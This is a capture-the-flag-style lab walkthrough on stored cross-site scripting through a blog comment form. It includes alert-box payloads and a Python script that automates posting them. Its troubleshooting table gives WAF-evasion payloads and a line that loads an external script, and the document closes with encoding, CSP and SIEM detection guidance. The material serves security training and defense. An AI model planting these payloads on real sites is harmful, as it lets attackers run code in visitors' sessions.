# Lab Walkthrough: Stored XSS into HTML Context with Nothing Encoded

* **Vulnerability Type:** Stored Cross-Site Scripting (Persistent XSS)
* **Target Context:** Raw HTML (Comment Functionality)
* **Skill Level:** Apprentice (Beginner)
* **Estimated Completion Time:** 5–10 minutes
* **Lab Status:** Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]
> The scripts, payloads, methodologies, and technical documentation contained in this repository are strictly intended for educational exercises, CTF competitions, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal. The author disclaims all liability for misuse.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](https://www.google.com/search?q=%231-vulnerability-architecture--mechanism)
2. [Lab Objectives & Verification Criteria](https://www.google.com/search?q=%232-lab-objectives--verification-criteria)
3. [Step-by-Step Exploitation Flow](https://www.google.com/search?q=%233-step-by-step-exploitation-flow)
4. [Cross-Site Scripting (XSS) Comparison](https://www.google.com/search?q=%234-cross-site-scripting-xss-comparison)
5. [Automated Exploitation Script (Python PoC)](https://www.google.com/search?q=%235-automated-exploitation-script-python-poc)
6. [Defense, Hardening & Secure Coding](https://www.google.com/search?q=%236-defense-hardening--secure-coding)
7. [SIEM Detection & Telemetry Analysis](https://www.google.com/search?q=%237-siem-detection--telemetry-analysis)
8. [Troubleshooting & Diagnostic Runbook](https://www.google.com/search?q=%238-troubleshooting--diagnostic-runbook)
9. [References & Standards](https://www.google.com/search?q=%239-references--standards)

---

## 1. Vulnerability Architecture & Mechanism

Stored XSS (Persistent XSS) occurs when a web application gathers input from a user, saves it securely in a backend database, and later embeds that raw, untrusted data into a web page served to other users without safe output encoding.

This is highly prized in red teaming operations because it creates a "watering hole" trap. The payload waits passively on the server, executing automatically against any victim who navigates to the compromised page.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                        STORED XSS EXECUTION FLOW                       │
└────────────────────────────────────────────────────────────────────────┘

  [1. Attacker] Submits malicious payload via a comment form:
  POST /post/comment 
  comment=<script>alert(1)</script>
           │
           ▼
  [2. Web Server] Saves the raw payload directly into the database.
           │
           ▼
  [3. Victim] Browses to the infected blog post:
  GET /post?postId=1
           │
           ▼
  [4. Web Server] Retrieves the comment from the database and reflects 
  it directly into the HTML response:
  <div>User says: <script>alert(1)</script></div>
           │
           ▼
  [5. Victim's Browser] Parses the DOM, encounters the script tag, and 
  executes the payload in the context of the victim's session.

```

> **Learning Checkpoint 1:** What makes Stored XSS fundamentally more dangerous than Reflected XSS? Stored XSS requires zero social engineering (no phishing links). A victim simply has to view a normal, legitimate page (like a blog post or profile) to be compromised.

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** Blog post comment submission form.
* **Primary Objective:** Execute arbitrary JavaScript in the browser context of anyone viewing the blog post.
* **Validation Signal:** Triggering the `alert()` function successfully when the infected page renders.

---

## 3. Step-by-Step Exploitation Flow

### Phase 1: Reconnaissance & Input Mapping

* Navigate to the target application and locate features that accept user input and display it publicly (e.g., blog comments).
* Input a harmless tracking string (e.g., `CyberTest123`) into the comment body, name, email, and website fields.
* Submit the comment and inspect the page source of the loaded blog post.
* *Observation:* The comment body string `CyberTest123` lands directly inside paragraph tags (`<p>CyberTest123</p>`) without any HTML entity encoding.

### Phase 2: Payload Construction

* Because the input lands in a raw HTML context without sanitization, standard HTML tags are fully interpreted by the browser.
* Construct a highly visible execution payload to verify the execution context:
`<script>alert(1)</script>`

### Phase 3: Injection & Execution

* Enter `<script>alert(1)</script>` into the comment text area.
* Fill out the required secondary fields (Name, Email, Website) with placeholder data.
* Click **Post comment**.
* Navigate back to the blog post view.
* *Result:* As the browser parses the HTML document, it executes the injected `<script>` tag, rendering an alert box. The lab is successfully solved.

> **Learning Checkpoint 2:** Why map all input fields during Phase 1? Developers often sanitize the primary comment body but forget to sanitize secondary fields like the "Author Name" or "Website URL". A thorough methodology checks every parameter for reflection.

---

## 4. Cross-Site Scripting (XSS) Comparison

Understanding payload persistence is vital for selecting the right attack vector during an engagement.

| XSS Variant | Delivery Mechanism | Persistence | Required Victim Interaction |
| --- | --- | --- | --- |
| **Stored (Persistent)** | Backend database to DOM | High (Disk) | None (Passive viewing) |
| **Reflected (Non-Persistent)** | Immediate HTTP response | None (In-memory) | Clicking a malicious link |
| **DOM-Based** | Client-side JS manipulation | None (Browser only) | Clicking a malicious link |

---

## 5. Automated Exploitation Script (Python PoC)

This script automates the submission of a Stored XSS payload, demonstrating how an attacker might programmatically infect multiple endpoints.

```python
#!/usr/bin/env python3
"""
Stored XSS Payload Injector (PoC)
Designed for authorized lab environments to demonstrate automated payload delivery.
"""

import requests
import sys

def inject_stored_xss(target_url, post_id):
    endpoint = f"{target_url}/post/comment"
    
    # Standard benign payload for proof of execution
    payload = "<script>alert(1)</script>"
    
    # Form data required by the target application
    data = {
        "csrf": "YOUR_CSRF_TOKEN_HERE", # Must be extracted dynamically in a real scenario
        "postId": post_id,
        "comment": payload,
        "name": "OffSecExplorer",
        "email": "test@example.com",
        "website": "http://example.com"
    }
    
    print(f"[*] Injecting payload into Post ID {post_id}...")
    try:
        response = requests.post(endpoint, data=data, timeout=5)
        
        if response.status_code == 200:
            print("[+] Payload successfully submitted.")
            print(f"[*] Navigate to {target_url}/post?postId={post_id} to verify execution.")
        else:
            print(f"[-] Submission failed. Status Code: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 exploit.py <target_base_url> <post_id>")
        sys.exit(1)
        
    inject_stored_xss(sys.argv[1], sys.argv[2])

```

---

## 6. Defense, Hardening & Secure Coding

To neutralize Stored XSS, applications must treat all database-retrieved data as untrusted before rendering it in the browser.

* **Context-Aware Output Encoding:** Convert dangerous characters into HTML entities strictly at the point of rendering, not at the point of storage.
* `<` becomes `&lt;`
* `>` becomes `&gt;`
* *Example (Node.js/Pug):* Use default unescaped interpolation `#{user.comment}` instead of raw HTML `!{user.comment}`.


* **Input Validation (Defense in Depth):** Implement strict allow-lists for expected input (e.g., rejecting comments containing `<` or `>` if plain text is expected).
* **Content Security Policy (CSP):** Deploy a strong CSP header to block inline script execution, serving as a robust fail-safe.
* `Content-Security-Policy: default-src 'self'; script-src 'self'`



> **Learning Checkpoint 3:** Why encode at the point of output rather than point of input (storage)? Storing HTML-encoded data in the database breaks secondary integrations (like sending the comment in a plain-text email or passing it to an API). Store raw, encode for the specific medium (HTML, JSON, XML) upon retrieval.

---

## 7. SIEM Detection & Telemetry Analysis

Stored XSS is often harder to detect at the point of execution because the payload originates from the internal database. Detection must focus on the initial `POST` request.

### Detection Rule Examples (Regex)

* **Script Tag Injection:** `(?i)<\s*script.*?>`
* **Event Handler Injection:** `(?i)\b(onmouseover|onerror|onload|onclick)\s*=`

### Splunk / SIEM Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined method=POST
| regex _raw="(?i)(<script>|onerror=|javascript:)"
| stats count by src_ip, uri_path
| where count > 0

```

---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **Payload appears as plain text** | Output Encoding is active. | View the page source. If you see `&lt;script&gt;`, the context is safe. You must hunt for a different injection point. |
| **HTTP 403 Forbidden on POST** | Web Application Firewall (WAF) block. | The WAF detected `<script>`. Use alternative payloads: `<img src=x onerror=alert(1)>` or `<svg onload=alert(1)>`. |
| **Payload truncated in database** | Database column length limits. | Use a minimalist payload: `<q/oncut=alert(1)>` or source an external script: `<script src=//x.io></script>`. |
| **Payload reflects but doesn't execute** | Content Security Policy (CSP). | Inspect HTTP headers. If a strict CSP is active, you must find a way to bypass it (e.g., JSONP endpoints, missing base-uri). |

---

## 9. References & Standards

* [OWASP Top 10-2021: A03 - Injection](https://www.google.com/search?q=https://owasp.org/Top10/A03_2021-Injection/)
* [PortSwigger: Cross-Site Scripting (XSS) Cheat Sheet](https://www.google.com/search?q=https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
* [OWASP: XSS Prevention Cheat Sheet](https://www.google.com/search?q=https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

---

> **Key Insight:** Stored XSS transforms a vulnerable web application into an automated attack platform. By persisting payloads in the database, adversaries achieve persistent, asymmetric execution against any user who accesses the tainted resource, making it a critical focus area during application penetration tests.
